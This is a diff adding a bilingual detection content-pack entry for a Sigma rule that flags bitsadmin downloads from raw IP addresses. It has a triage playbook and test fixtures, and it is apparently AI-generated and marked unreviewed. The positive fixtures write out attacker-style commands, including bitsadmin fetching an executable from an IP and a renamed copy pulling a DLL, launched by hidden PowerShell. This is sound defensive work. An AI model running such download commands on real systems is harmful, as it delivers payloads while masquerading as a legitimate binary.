@@ -1,0 +1,135 @@
+{
+  "rule": {
+    "id": "99c840f2-2012-46fd-9141-c761987550ef",
+    "title": "Suspicious Download From Direct IP Via Bitsadmin",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_bitsadmin_download_direct_ip.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_bitsadmin_download_direct_ip.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1036.003",
+      "T1197"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó bitsadmin.exe (o una copia renombrada) para crear o agregar un job de BITS que descarga desde una URL con dirección IP en lugar de nombre de dominio. Es una técnica común para traer payloads usando un binario legítimo de Windows.",
+      "what_it_detects": "Procesos con Image terminado en \\bitsadmin.exe u OriginalFileName bitsadmin.exe cuyo CommandLine incluye /transfer, /create o /addfile y una URL que empieza con un dígito tras '://' (por ejemplo http://198.51.100.23/). Se excluye '://7-' para no alertar por descargas de 7-zip.org.",
+      "why_it_matters": "BITS Jobs (T1197) permite descargar archivos en segundo plano y mantener persistencia con un binario firmado por Microsoft. Usar una IP directa evita DNS y reputación de dominio; si el binario está renombrado, también hay enmascaramiento (T1036.003).",
+      "triage_steps": [
+        "Revisar el CommandLine completo: IP, puerto, ruta remota, nombre del archivo y carpeta destino local (Public, ProgramData, Temp son señales de alerta).",
+        "Comparar Image con OriginalFileName; si bitsadmin.exe se ejecuta desde una ruta fuera de System32 o con otro nombre, tratarlo como enmascaramiento.",
+        "Analizar ParentImage y su línea de comandos: cmd, powershell, wscript, mshta u Office como padre son sospechosos.",
+        "Verificar si la IP es interna y conocida (servidor de distribución) o externa; consultar reputación y tráfico de red del host hacia esa IP.",
+        "Buscar el archivo descargado en el endpoint, obtener su hash y revisar si se ejecutó después (procesos hijos, eventos del mismo host en +/- 15 minutos).",
+        "Enumerar jobs de BITS activos (bitsadmin /list /allusers /verbose o Get-BitsTransfer) y revisar si alguno tiene /SetNotifyCmdLine para persistencia.",
+        "Revisar alertas previas del mismo usuario, host e IP de destino."
+      ],
+      "false_positives": [
+        "Scripts de administración o despliegue de software que descargan desde servidores internos referenciados por IP.",
+        "Instaladores o herramientas de soporte heredadas que aún usan bitsadmin con URLs por IP.",
+        "Dominios legítimos que empiezan con un dígito (por ejemplo, https://1drv.ms) que activan el patrón '://1'."
+      ],
+      "response_steps": [
+        "Confirmar con el dueño del host o el equipo de TI si la descarga era esperada antes de actuar.",
+        "Si no está autorizada, aislar el endpoint y bloquear la IP de destino en el proxy o firewall.",
+        "Cancelar los jobs de BITS maliciosos (bitsadmin /cancel) tras documentarlos, y poner en cuarentena el archivo descargado conservando su hash.",
+        "Buscar la misma IP, hash y línea de comandos en el resto de la flota; restablecer credenciales del usuario si hubo ejecución del payload."
+      ],
+      "severity_rationale": "Nivel alto porque descargar desde una IP directa con bitsadmin es poco común en uso legítimo y suele indicar entrega de payload o persistencia."
+    },
+    "en": {
+      "summary": "bitsadmin.exe (or a renamed copy) created or added a BITS job that downloads from a URL using a raw IP address instead of a domain. Attackers often use this to fetch payloads with a legitimate Windows binary.",
+      "what_it_detects": "Processes with Image ending in \\bitsadmin.exe or OriginalFileName bitsadmin.exe whose CommandLine contains /transfer, /create or /addfile and a URL with a digit right after '://' (e.g. http://198.51.100.23/). '://7-' is excluded so 7-zip.org downloads do not alert.",
+      "why_it_matters": "BITS Jobs (T1197) lets attackers download files in the background and persist through a Microsoft-signed binary. A direct IP avoids DNS and domain reputation checks; a renamed binary adds masquerading (T1036.003).",
+      "triage_steps": [
+        "Read the full CommandLine: IP, port, remote path, file name and local destination (Public, ProgramData or Temp are red flags).",
+        "Compare Image with OriginalFileName; bitsadmin running outside System32 or under another name indicates masquerading.",
+        "Check ParentImage and its command line; cmd, powershell, wscript, mshta or Office parents are suspicious.",
+        "Determine whether the IP is a known internal server or external; check reputation and the host's network traffic to it.",
+        "Locate the downloaded file, hash it, and check whether it executed (child processes, same-host events within +/- 15 minutes).",
+        "List active BITS jobs (bitsadmin /list /allusers /verbose or Get-BitsTransfer) and look for /SetNotifyCmdLine persistence.",
+        "Review earlier alerts for the same user, host and destination IP."
+      ],
+      "false_positives": [
+        "Admin or software deployment scripts downloading from internal servers referenced by IP.",
+        "Legacy installers or support tools still using bitsadmin with IP-based URLs.",
+        "Legitimate domains starting with a digit (e.g. https://1drv.ms) matching the '://1' pattern."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or IT whether the download was expected before acting.",
+        "If unauthorized, isolate the endpoint and block the destination IP at the proxy or firewall.",
+        "Document then cancel malicious BITS jobs (bitsadmin /cancel) and quarantine the downloaded file, keeping its hash.",
+        "Hunt for the same IP, hash and command line across the fleet; reset user credentials if the payload ran."
+      ],
+      "severity_rationale": "High because bitsadmin downloading from a raw IP is rare in legitimate use and usually signals payload delivery or persistence."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bitsadmin /transfer downloading an executable from a raw external IP into C:\\Users\\Public",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /transfer upd /download /priority high http://198.51.100.23/files/update.exe C:\\Users\\Public\\update.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat"
+        }
+      },
+      {
+        "description": "Renamed bitsadmin (matched via OriginalFileName) adding a file from an IP with port to a BITS job",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\ProgramData\\svchelper.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "svchelper.exe /addfile syncjob http://203.0.113.45:8080/a.dll C:\\ProgramData\\a.dll",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden -File C:\\ProgramData\\s.ps1"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "bitsadmin downloading 7-Zip from 7-zip.org, excluded by the '://7-' filter",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /transfer dl7z /download https://7-zip.org/a/7z2301-x64.exe C:\\Temp\\7z2301-x64.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c install_tools.cmd"
+        }
+      },
+      {
+        "description": "bitsadmin transfer from a domain name, no IP after '://'",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_deploy",
+          "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+          "OriginalFileName": "bitsadmin.exe",
+          "CommandLine": "bitsadmin /transfer agentpkg /download https://downloads.example.com/agent/setup.msi C:\\Deploy\\setup.msi",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c deploy_agent.cmd"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
